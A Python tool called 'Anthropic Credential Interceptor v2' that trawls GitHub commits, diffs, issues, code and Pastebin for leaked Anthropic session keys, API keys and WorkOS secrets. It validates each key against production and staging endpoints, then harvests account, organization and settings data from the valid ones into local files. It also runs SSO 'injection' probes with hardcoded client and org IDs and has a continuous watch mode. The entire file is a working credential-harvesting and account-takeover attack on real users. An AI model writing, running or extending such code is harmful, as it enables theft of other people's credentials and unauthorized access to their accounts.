#!/usr/bin/env python3
"""
Anthropic Credential Interceptor v2 — Aggressive Multi-Vector Hunter
=====================================================================
Monitors: GitHub commits, GitHub issues, Pastebin, Reddit, GitLab
Validates: Against api.anthropic.com AND api-staging.anthropic.com
Exploits: Fetches /api/account + /api/organizations for valid keys
Tests: WorkOS SSO injection (production + staging credentials)
Modes: --once (single scan) or --watch (continuous, every N minutes)

Sources prioritized by actual results:
- GitHub commit search: 81+ results for sk-ant-sid (BEST)
- GitHub issue search: 31+ results for sk-ant-sid, 1,607 for leaked keys
- GitHub code search: may filter secrets but worth trying
- Pastebin/psbdmp: API dependent, unreliable
- Reddit: blocked without auth, skip for now
"""

import asyncio
import argparse
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from urllib.parse import quote

import aiohttp

# ── Configuration ─────────────────────────────────────────────────
OUTPUT_DIR = "/tmp/cred-interceptor-v2"
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.chmod(OUTPUT_DIR, 0o700)  # Restrict access — contains credentials

# SSL disabled for origin IP access (160.79.104.10 has cert mismatch)
# For production use, re-enable SSL and add cert verification for non-origin requests

# Both production and staging credentials (from session-010 and this session)
WORKOS_CREDS = {
    "production": {
        "client_id": "client_01HWC228HRS9H2QWN9K8HARHVV",
        "org_id": "org_01JKGMKQG70C5FRXR2WPHTZNJG",
        "saml_acs": "https://auth.workos.com/sso/saml/acs/wLS2c1AwWslNmDBPWs9jdPnH8",
        "callback": "https://claude.ai/sso-callback",
        "api_base": "https://api.anthropic.com",
    },
    "staging": {
        "client_id": "client_01HWC227ZGQ9RF9MY2KHC9QJSK",
        "org_id": "org_01JWY3FF9CZBQAYKG2NK4X9WSP",
        "callback": "https://claude-ai.staging.ant.dev/sso-callback",
        "api_base": "https://api-staging.anthropic.com",
        "oauth_platform": "https://platform.staging.ant.dev",
        "oauth_client_id": "22422756-60c9-4084-8eb7-27705fd5cf9a",
    },
}

# Credential patterns to hunt
CRED_PATTERNS = [
    (re.compile(r'sk-ant-sid0[12]-[A-Za-z0-9+/=-]{30,}'), "session_key"),
    (re.compile(r'sk-ant-api0[23]-[A-Za-z0-9+/=-]{30,}'), "api_key"),
    (re.compile(r'sk_workos_[A-Za-z0-9]{20,60}'), "workos_secret"),
    (re.compile(r'workos.*client_secret[=:]\s*["\']?(sk_workos_[A-Za-z0-9]+)', re.I), "workos_secret_env"),
    (re.compile(r'ANTHROPIC_API_KEY[=:]\s*["\']?(sk-ant-[A-Za-z0-9+/=-]{30,})', re.I), "api_key_env"),
    (re.compile(r'"sessionKey"\s*:\s*"(sk-ant-sid0[12]-[^"]+)"', re.I), "session_key_json"),
]

VALID_KEYS = []
SCAN_STATS = {"github_commits": 0, "github_issues": 0, "github_code": 0,
              "pastebin": 0, "total_extracted": 0, "total_validated": 0, "total_valid": 0}

def log(msg, level="INFO"):
    ts = time.strftime('%H:%M:%S')
    prefix = {"INFO": "•", "FOUND": "🔑", "VALID": "🔥", "ERROR": "❌", "SSO": "🏢"}
    p = prefix.get(level, "•")
    print(f"[{ts}] {p} {msg}", flush=True)

def save_valid(key_data):
    VALID_KEYS.append(key_data)
    path = f"{OUTPUT_DIR}/valid_keys.json"
    with open(path, "w") as f:
        json.dump(VALID_KEYS, f, indent=2, default=str)
    os.chmod(path, 0o600)
    # Also append to running log
    log_path = f"{OUTPUT_DIR}/found_keys.log"
    with open(log_path, "a") as f:
        f.write(json.dumps({**key_data, "found_at": datetime.now(timezone.utc).isoformat()}) + "\n")
    os.chmod(log_path, 0o600)

def save_raw_find(finding):
    """Save raw key candidates before validation."""
    path = f"{OUTPUT_DIR}/raw_finds.jsonl"
    with open(path, "a") as f:
        f.write(json.dumps({**finding, "found_at": datetime.now(timezone.utc).isoformat()}) + "\n")
    os.chmod(path, 0o600)

# ── Key Validation ────────────────────────────────────────────────
async def validate_key(session, key, label="key"):
    """Test a session/API key against BOTH production and staging.
    Tries Bearer auth first (session keys), then x-api-key (API keys)."""
    results = []

    # Determine auth method: session keys use Bearer, API keys use x-api-key
    if key.startswith("sk-ant-sid"):
        auth_methods = [("Authorization", f"Bearer {key}")]
    elif key.startswith("sk-ant-api"):
        auth_methods = [("x-api-key", key)]
    else:
        # Unknown format — try both
        auth_methods = [
            ("Authorization", f"Bearer {key}"),
            ("x-api-key", key),
        ]

    for env_name, env_config in [
        ("production", "https://api.anthropic.com"),
        ("staging", "https://api-staging.anthropic.com"),
    ]:
        url = f"{env_config}/api/account"
        for header_name, header_val in auth_methods:
            try:
                headers = {header_name: header_val}
                async with session.get(url, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=8)) as resp:
                    body = await resp.text()
                    if resp.status == 200:
                        data = json.loads(body)
                        log(f"  ✅ {env_name}: {data.get('email','?')} | {data.get('display_name','?')}", "VALID")
                        results.append({
                            "env": env_name, "valid": True, "key": key, "label": label,
                            "email": data.get("email"), "name": data.get("display_name"),
                            "user_id": data.get("user_id"), "uuid": data.get("uuid"),
                            "full_data": data, "auth_method": header_name,
                        })
                        break  # Found valid method, stop trying for this env
                    elif resp.status == 401:
                        continue  # Try next auth method
                    elif resp.status == 403:
                        continue
            except Exception:
                pass

    return results

async def exploit_valid_key(session, key_data):
    """Once we have a valid key, extract maximum data."""
    key = key_data["key"]
    headers = {"Authorization": f"Bearer {key}"}

    # Fetch organizations
    try:
        async with session.get("https://api.anthropic.com/api/organizations",
                               headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            if resp.status == 200:
                org_data = await resp.json()
                key_data["org_data"] = org_data
                log(f"  🏢 Orgs: {json.dumps(org_data)[:300]}", "VALID")
    except Exception as e:
        log(f"  Org fetch error: {e}", "ERROR")

    # Fetch account settings
    try:
        async with session.get("https://api.anthropic.com/api/account/settings",
                               headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            if resp.status == 200:
                settings = await resp.json()
                key_data["settings"] = settings
                log(f"  ⚙️ Settings: {json.dumps(settings)[:200]}", "VALID")
    except Exception:
        pass

    save_valid(key_data)
    return key_data

# ── GitHub Searches ───────────────────────────────────────────────
async def search_github_commits(session, page=1):
    """Search GitHub commits for credential patterns. 81+ results confirmed."""
    results = []
    queries = [
        "sk-ant-sid",        # Session keys
        "sk-ant-api",        # API keys
        "ANTHROPIC_API_KEY", # Env var format
        "sk_workos_",        # WorkOS secrets
    ]
    headers = {"Accept": "application/vnd.github+json"}
    gh_token = os.environ.get("GITHUB_TOKEN", "")
    if gh_token:
        headers["Authorization"] = f"token {gh_token}"

    for q in queries:
        url = f"https://api.github.com/search/commits?q={q}&per_page=20&page={page}&sort=indexed&order=desc"
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=12)) as resp:
                # Check rate limit
                remaining = resp.headers.get("X-RateLimit-Remaining")
                if remaining and int(remaining) < 5:
                    reset_ts = int(resp.headers.get("X-RateLimit-Reset", 0))
                    wait = max(reset_ts - time.time(), 0) + 2
                    log(f"  ⏳ Rate limit — sleeping {wait:.0f}s", "ERROR")
                    await asyncio.sleep(wait)

                if resp.status != 200:
                    if resp.status == 403:
                        log(f"  GitHub 403 (rate limited or auth required)", "ERROR")
                    continue
                data = await resp.json()
                items = data.get("items", [])
                SCAN_STATS["github_commits"] += len(items)

                for item in items[:15]:
                    repo = item.get("repository", {}).get("full_name", "")
                    sha = item.get("sha", "")
                    msg = item.get("commit", {}).get("message", "")
                    commit_url = item.get("html_url", "")
                    diff_count = 0

                    # Extract keys from commit messages
                    for pattern, ptype in CRED_PATTERNS:
                        found = pattern.findall(msg)
                        for match in found:
                            key = match if isinstance(match, str) else match[0]
                            if len(key) > 30 and "xxx" not in key.lower() and "example" not in key.lower():
                                finding = {"key": key, "type": ptype, "source": "github_commit",
                                           "repo": repo, "sha": sha[:12], "url": commit_url}
                                results.append(finding)
                                save_raw_find(finding)
                                log(f"  Commit: {key[:45]}... | {repo}", "FOUND")

                    # Also fetch commit diff for actual key values in removed code (limit: 10 diffs per query)
                    if sha and diff_count < 10:
                        diff_count += 1
                        try:
                            diff_url = f"https://api.github.com/repos/{repo}/commits/{sha}"
                            async with session.get(diff_url, headers=headers,
                                                   timeout=aiohttp.ClientTimeout(total=10)) as dr:
                                if dr.status == 200:
                                    diff_data = await dr.json()
                                    diff_text = json.dumps(diff_data)
                                    existing_keys = {r["key"] for r in results}
                                    for pat, pt in CRED_PATTERNS:
                                        found_in_diff = pat.findall(diff_text)
                                        for m in found_in_diff:
                                            k = m if isinstance(m, str) else m[0]
                                            if len(k) > 30 and "xxx" not in k.lower() and k not in existing_keys:
                                                finding2 = {"key": k, "type": pt, "source": "github_commit_diff",
                                                           "repo": repo, "sha": sha[:12], "url": commit_url}
                                                results.append(finding2)
                                                save_raw_find(finding2)
                                                log(f"  Diff: {k[:45]}... | {repo}", "FOUND")
                        except Exception:
                            pass

                await asyncio.sleep(1.5)  # Rate limit
        except Exception as e:
            log(f"  GitHub commit search error: {e}", "ERROR")

    return results

async def search_github_issues(session, page=1):
    """Search GitHub issues for credential leaks. 1,607+ results for leaked keys."""
    results = []
    queries = [
        '"ANTHROPIC_API_KEY" leaked',
        '"sk-ant-sid" leaked',
        '"API key" anthropic exposed',
        'leaked anthropic key',
    ]
    headers = {"Accept": "application/vnd.github.v3+json"}
    gh_token = os.environ.get("GITHUB_TOKEN", "")
    if gh_token:
        headers["Authorization"] = f"token {gh_token}"

    for q in queries:
        url = f"https://api.github.com/search/issues?q={q}&per_page=15&page={page}&sort=updated&order=desc"
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=12)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json()
                items = data.get("items", [])
                SCAN_STATS["github_issues"] += len(items)

                for item in items[:10]:
                    title = item.get("title", "")
                    body = item.get("body", "") or ""
                    issue_url = item.get("html_url", "")
                    repo = item.get("repository_url", "").replace("https://api.github.com/repos/", "")

                    # Search title + body for keys
                    text = title + " " + body
                    for pattern, ptype in CRED_PATTERNS:
                        found = pattern.findall(text)
                        for match in found:
                            key = match if isinstance(match, str) else match[0]
                            if len(key) > 30 and "xxx" not in key.lower():
                                finding = {"key": key, "type": ptype, "source": "github_issue",
                                           "repo": repo, "title": title[:100], "url": issue_url}
                                results.append(finding)
                                save_raw_find(finding)
                                log(f"  Issue: {key[:45]}... | {title[:60]}", "FOUND")

                await asyncio.sleep(1.5)
        except Exception as e:
            log(f"  GitHub issue search error: {e}", "ERROR")

    return results

async def search_github_code(session, page=1):
    """Search GitHub code for credential patterns. May filter secrets but worth trying."""
    results = []
    queries = ["sk-ant-sid02-", "sk-ant-api03-", "ANTHROPIC_API_KEY=sk-ant"]
    headers = {"Accept": "application/vnd.github.v3+json"}
    gh_token = os.environ.get("GITHUB_TOKEN", "")
    if gh_token:
        headers["Authorization"] = f"token {gh_token}"

    for q in queries:
        url = f"https://api.github.com/search/code?q={q}&per_page=20&page={page}&sort=indexed&order=desc"
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=12)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json()
                items = data.get("items", [])
                SCAN_STATS["github_code"] += len(items)

                for item in items[:10]:
                    repo = item.get("repository", {}).get("full_name", "")
                    path = item.get("path", "")
                    html_url = item.get("html_url", "")

                    # Try to fetch raw content
                    for branch in ["main", "master"]:
                        raw_url = f"https://raw.githubusercontent.com/{repo}/{branch}/{path}"
                        try:
                            async with session.get(raw_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                                if r.status == 200:
                                    text = await r.text()
                                    for pattern, ptype in CRED_PATTERNS:
                                        found = pattern.findall(text)
                                        for match in found:
                                            key = match if isinstance(match, str) else match[0]
                                            if len(key) > 30 and "xxx" not in key.lower():
                                                finding = {"key": key, "type": ptype, "source": "github_code",
                                                           "repo": repo, "path": path, "url": html_url}
                                                results.append(finding)
                                                save_raw_find(finding)
                                                log(f"  Code: {key[:45]}... | {repo}/{path}", "FOUND")
                                    break  # Got the file, stop trying branches
                        except Exception:
                            pass
                await asyncio.sleep(1.5)
        except Exception as e:
            log(f"  GitHub code search error: {e}", "ERROR")

    return results

# ── Pastebin Search ───────────────────────────────────────────────
async def search_pastebin(session):
    """Search Pastebin via psbdmp.ws archive."""
    results = []
    queries = ["sk-ant-sid", "sk-ant-api", "ANTHROPIC_API_KEY"]

    for q in queries:
        try:
            url = f"https://psbdmp.ws/api/v3/search/{quote(q)}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json()
                for item in data.get("data", [])[:10]:
                    pid = item.get("id", "")
                    # Try to fetch paste content
                    try:
                        raw_url = f"https://pastebin.com/raw/{pid}"
                        async with session.get(raw_url, timeout=aiohttp.ClientTimeout(total=8)) as pr:
                            if pr.status == 200:
                                content = await pr.text()
                                for pattern, ptype in CRED_PATTERNS:
                                    found = pattern.findall(content)
                                    for match in found:
                                        key = match if isinstance(match, str) else match[0]
                                        if len(key) > 30:
                                            finding = {"key": key, "type": ptype, "source": "pastebin",
                                                       "paste_id": pid}
                                            results.append(finding)
                                            save_raw_find(finding)
                                            log(f"  Pastebin: {key[:45]}... | {pid}", "FOUND")
                    except Exception:
                        pass
                SCAN_STATS["pastebin"] += len(data.get("data", []))
        except Exception:
            pass

    return results

# ── WorkOS SSO Exploitation ───────────────────────────────────────
async def test_workos_sso(session):
    """Test SSO injection on both production and staging WorkOS configs."""
    for env_name, creds in WORKOS_CREDS.items():
        log(f"  Testing {env_name} SSO...", "SSO")

        # Initiate SSO authorize (org + provider method — confirmed working)
        provider_url = (
            f"https://api.workos.com/sso/authorize"
            f"?client_id={creds['client_id']}"
            f"&redirect_uri={quote(creds['callback'], safe='')}"
            f"&state=credhunt_{int(time.time())}"
            f"&response_type=code"
            f"&organization={creds['org_id']}"
            f"&provider=Google"
        )
        try:
            async with session.get(provider_url, timeout=aiohttp.ClientTimeout(total=10),
                                   allow_redirects=False) as resp:
                body = await resp.text()
                loc = resp.headers.get("Location", "")

                if resp.status in (302, 303) and "error" not in loc.lower():
                    log(f"  🔥 {env_name} SSO redirect: {loc[:200]}", "SSO")
                elif resp.status == 200 and "SAMLRequest" in body:
                    # Extract Google redirect URL
                    google_urls = re.findall(r'action=["\'](https://accounts.google.com/[^"\']+)', body)
                    hd_params = re.findall(r'hd=([^&\s"\']+)', body)
                    log(f"  ✅ {env_name} SSO initiated → Google", "SSO")
                    if google_urls:
                        log(f"     Google URL: {google_urls[0][:200]}", "SSO")
                    if hd_params:
                        log(f"     Domain hint: {hd_params}", "SSO")
                else:
                    log(f"  {env_name} SSO status: {resp.status}", "SSO")
        except Exception as e:
            log(f"  {env_name} SSO error: {e}", "ERROR")

        await asyncio.sleep(0.5)

    # Also try the staging OAuth authorize flow
    if "staging" in WORKOS_CREDS:
        staging = WORKOS_CREDS["staging"]
        oauth_url = (
            f"{staging.get('oauth_platform', 'https://platform.staging.ant.dev')}/oauth/authorize"
            f"?response_type=code"
            f"&client_id={staging.get('oauth_client_id', '')}"
            f"&redirect_uri={quote('http://localhost/callback', safe='')}"
            f"&scope=openid+profile+email"
            f"&code_challenge=credhunt_test"
            f"&code_challenge_method=S256"
            f"&state=credhunt"
        )
        try:
            async with session.get(oauth_url, headers={"User-Agent": "Mozilla/5.0"},
                                   timeout=aiohttp.ClientTimeout(total=12),
                                   allow_redirects=True) as resp:
                body = await resp.text()
                log(f"  Staging OAuth authorize: {resp.status} ({len(body)} bytes)", "SSO")
        except Exception as e:
            log(f"  Staging OAuth authorize error: {e}", "ERROR")

# ── Main Scan Loop ────────────────────────────────────────────────
async def run_scan(pages=2):
    """Run a single complete scan across all sources."""
    log("=" * 60)
    log("🔍 ANTHROPIC CREDENTIAL INTERCEPTOR v2")
    log("   Multi-vector: GitHub commits/issues/code + Pastebin + SSO injection")
    log("=" * 60)

    connector = aiohttp.TCPConnector(ssl=False, limit=15)
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        # ═══ PHASE 1: HUNT ═══
        log("\n📡 PHASE 1: HUNTING FOR CREDENTIALS\n")

        all_findings = []

        # GitHub commits (BEST: 81+ results)
        for page in range(1, pages + 1):
            log(f"  GitHub commits page {page}...")
            findings = await search_github_commits(session, page)
            all_findings.extend(findings)
            await asyncio.sleep(1)

        # GitHub issues (1,607+ results)
        for page in range(1, pages + 1):
            log(f"  GitHub issues page {page}...")
            findings = await search_github_issues(session, page)
            all_findings.extend(findings)
            await asyncio.sleep(1)

        # GitHub code (backup)
        for page in range(1, min(pages + 1, 2)):
            log(f"  GitHub code page {page}...")
            findings = await search_github_code(session, page)
            all_findings.extend(findings)
            await asyncio.sleep(1)

        # Pastebin
        log("  Pastebin...")
        pb_findings = await search_pastebin(session)
        all_findings.extend(pb_findings)

        SCAN_STATS["total_extracted"] = len(all_findings)

        # Deduplicate by full key
        seen = set()
        unique = []
        for f in all_findings:
            k = f["key"]
            if k not in seen:
                seen.add(k)
                unique.append(f)

        log(f"\n  📊 Found {len(all_findings)} raw, {len(unique)} unique keys\n")

        # ═══ PHASE 2: VALIDATE ═══
        log("🔬 PHASE 2: VALIDATING KEYS\n")

        for i, finding in enumerate(unique):
            key = finding["key"]
            key_type = finding.get("type", "unknown")
            SCAN_STATS["total_validated"] += 1

            if i % 10 == 0:
                log(f"  Progress: {i}/{len(unique)}")

            results = await validate_key(session, key, key_type)

            for result in results:
                if result.get("valid"):
                    SCAN_STATS["total_valid"] += 1
                    await exploit_valid_key(session, result)

            await asyncio.sleep(0.2)  # Rate limit

        # ═══ PHASE 3: SSO EXPLOITATION ═══
        log("\n🏢 PHASE 3: WORKOS SSO INJECTION\n")
        await test_workos_sso(session)

    # ═══ FINAL REPORT ═══
    log(f"\n{'='*60}")
    log(f"🏁 SCAN COMPLETE")
    log(f"{'='*60}")
    for k, v in SCAN_STATS.items():
        log(f"  {k}: {v}")
    log(f"  VALID keys found: {len(VALID_KEYS)}")

    if VALID_KEYS:
        log(f"\n🔴🔴🔴 VALID CREDENTIALS CAPTURED: 🔴🔴🔴")
        for v in VALID_KEYS:
            log(f"  📧 {v.get('email', '?')} | 👤 {v.get('name', '?')}")
            log(f"     Env: {v.get('env', '?')} | Key: {v.get('key', '')[:40]}...")
            if v.get("org_data"):
                log(f"     🏢 {json.dumps(v.get('org_data'))[:200]}")
    else:
        log("\n  No valid keys found. Session keys expire quickly — run frequently.")

    log(f"\n  Results: {OUTPUT_DIR}/valid_keys.json")
    log(f"  Raw finds: {OUTPUT_DIR}/raw_finds.jsonl")
    log(f"  Found log: {OUTPUT_DIR}/found_keys.log")

# ── CLI ───────────────────────────────────────────────────────────
async def main():
    parser = argparse.ArgumentParser(description="Anthropic Credential Interceptor v2")
    parser.add_argument("--once", action="store_true", default=True,
                        help="Single scan (default)")
    parser.add_argument("--watch", type=int, metavar="MINUTES",
                        help="Continuous monitoring, scan every N minutes")
    parser.add_argument("--pages", type=int, default=2,
                        help="GitHub pages to scan per source (default: 2)")
    args = parser.parse_args()

    if args.watch:
        log(f"🔄 Continuous mode: scanning every {args.watch} minutes")
        log(f"   Press Ctrl+C to stop\n")
        while True:
            try:
                await run_scan(pages=args.pages)
                log(f"\n⏰ Next scan in {args.watch} minutes...\n")
                await asyncio.sleep(args.watch * 60)
            except KeyboardInterrupt:
                log("\n⏹️ Stopped by user")
                break
            except Exception as e:
                log(f"Scan error: {e}", "ERROR")
                await asyncio.sleep(60)
    else:
        await run_scan(pages=args.pages)


if __name__ == "__main__":
    asyncio.run(main())
